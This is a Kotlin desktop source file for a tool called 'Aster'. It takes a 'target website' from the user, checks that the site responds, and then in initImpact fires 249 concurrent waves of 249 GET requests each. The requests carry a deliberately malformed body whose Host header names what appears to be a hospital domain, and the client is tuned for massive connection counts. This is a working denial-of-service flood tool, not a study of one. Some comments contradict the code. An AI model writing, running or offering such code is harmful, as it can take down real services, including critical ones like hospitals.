package aster

import androidx.compose.desktop.ui.tooling.preview.Preview
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.padding
import androidx.compose.material.Button
import androidx.compose.material.MaterialTheme
import androidx.compose.material.Text
import androidx.compose.material.TextField
import androidx.compose.runtime.Composable
import androidx.compose.runtime.mutableStateOf
import androidx.compose.ui.Modifier
import androidx.compose.ui.unit.dp
import io.ktor.client.HttpClient
import io.ktor.client.request.get
import io.ktor.client.request.setBody
import io.ktor.client.utils.EmptyContent.headers
import io.ktor.http.HttpHeaders
import io.ktor.http.headers
import io.ktor.http.isSuccess
import io.ktor.util.InternalAPI
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import io.ktor.client.*
import io.ktor.client.engine.cio.CIO
import io.ktor.client.engine.cio.*
import io.ktor.network.tls.*

@Composable
@Preview
fun Aster() {

    val asterViewModel = AsterViewModel()


    MaterialTheme {

// Create a column that will hold the input box, label, and button.
        Column(
            modifier = Modifier
                .padding(all = 16.dp)
                .fillMaxWidth()

        ){
            // Create an input box.
            TextField(
                value = asterViewModel.targetUrl.value,
                onValueChange = {
                                asterViewModel.changeName(it)
                },
                label = { Text("Enter target website") }
            )

            // Create a label.
            Text("Current status: ${asterViewModel.statusMsg.value}")

            // Create a button.
            Button(onClick = {
                asterViewModel.initIntro()
                //chatGPT()




            }) {
                Text("Submit")
            }
        }

    }
}


class AsterViewModel {

    // State variable that holds the name.
    val targetUrl = mutableStateOf("")
    val statusMsg = mutableStateOf("")

    // Function to change the name.
    fun changeName(newName: String) {
        targetUrl.value = newName
    }

    fun setStatusMsg(input: String){
        statusMsg.value = input
    }

    fun initIntro(){
        val client = HttpClient()
        CoroutineScope(Dispatchers.IO).launch {

            try {
                val response = client.get(urlString = targetUrl.value)
                // Handle the response here
                //Log.i("NREQ", "Request $i completed with response: ${response.status}")
                println("Request completed with response: ${response.status}")
                setStatusMsg("Request completed with response: ${response.status}")


                val statusCode = response.status.value
                if (statusCode in 200..299) {
                    println("OK")
                    CoroutineScope(Dispatchers.IO).launch {
                        chatGPT()
                    }
                } else if (statusCode in 300..399) {
                    println("Redirection")
                } else if (statusCode in 400..499) {
                    println("Client Error")
                } else if (statusCode in 500..599) {
                    println("Server Error")
                } else {
                    println("Fail")
                }

                println()
            } catch (e: Exception) {
                // Handle errors here
                // Log.e("NERR", "Request $i failed with exception: $e")
                println("Request failed with exception: $e")
                setStatusMsg("Request failed with exception: $e")
                println()
            }
        }
    }

    fun initImpact(){
        // Create a coroutine scope that is not tied to the main thread.

        //Log.e("STEP1","in method")
        val client = HttpClient(CIO){
            headers {
                append(HttpHeaders.Accept, "application/json")
                append(HttpHeaders.Authorization, "Bearer my-token")
                append(HttpHeaders.Connection, "keep-alive")
            }
            install(io.ktor.client.plugins.UserAgent) {
                // Set the user agent.
                agent = "Platinum Coffee Mix 3 in 1"
            }
            engine {
                maxConnectionsCount = 1_000_000
                endpoint {
                    // this: EndpointConfig
                    maxConnectionsPerRoute = 1_000
                    pipelineMaxSize = 786
                    keepAliveTime = 1_000
                    connectTimeout = 1_000
                    connectAttempts = 28
                }
            }
        }

        val malformedRequest = """
        GET / HTTP/1.1
        Host: www.oschospitalmm.com
        
        This is an invalid request
    """.trimIndent()

        // Perform 9 HTTP requests
        repeat(249) {

            //GlobalScope.launch(Dispatchers.IO) {
            CoroutineScope(Dispatchers.IO).launch {
                for (i in 0 until 249) {
                    try {
                        val response = client.get(urlString = targetUrl.value) {
                            setBody(malformedRequest)
                        }
                        // Handle the response here
                        //Log.i("NREQ", "Request $i completed with response: ${response.status}")
                        println("Request $i of wave $it completed with response: ${response.status}")
                        setStatusMsg("Request $i of wave $it completed with response: ${response.status}")
                        println()
                    } catch (e: Exception) {
                        // Handle errors here
                       // Log.e("NERR", "Request $i failed with exception: $e")
                        println("Request $i of wave $it failed with exception: $e")
                        setStatusMsg("Request $i of wave $it failed with exception: $e")
                        println()
                    }
                }
            }
        }
    }

}
